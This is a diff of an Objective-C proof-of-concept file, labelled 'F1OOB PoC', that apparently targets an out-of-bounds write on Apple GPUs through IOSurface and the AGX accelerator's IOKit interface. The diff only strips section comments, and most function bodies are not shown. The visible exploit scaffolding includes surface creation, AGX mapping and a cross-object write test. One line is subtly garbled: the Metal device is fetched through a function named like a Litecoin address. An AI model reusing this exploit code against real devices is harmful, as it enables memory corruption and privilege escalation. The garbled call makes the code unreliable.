@@ -5,8 +5,6 @@
 #import <IOKit/IOKitLib.h>
 #import <mach/mach.h>
 
-// MARK: - IOSurface F1 Surface Creation
-
 static uint32_t create_f1_surface(void) {
     const char *xml = 
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
@@ -69,8 +67,6 @@ static uint32_t create_f1_surface(void) {
     return surface_id;
 }
 
-// MARK: - AGX Resource Mapping
-
 static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_t *agx_conn) {
     io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
         IOServiceMatching("AGXAcceleratorG18P"));
@@ -109,8 +105,6 @@ static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_
     return output[0];
 }
 
-// MARK: - Metal Setup
-
 static id<MTLDevice> get_metal_device(void) {
     id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
     if (!dev) {
@@ -126,8 +120,6 @@ static uint64_t get_gpu_address(id<MTLBuffer> buffer) {
     return 0;
     #endif
 }
-
-// MARK: - Cross-Object OOB Write Test
 
 static int test_cross_object_write(void) {
     NSLog(@"=== F1OOB PoC Starting ===");
@@ -200,8 +192,6 @@ static int test_cross_object_write(void) {
         return 0;
     }
 }
-
-// MARK: - Main
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
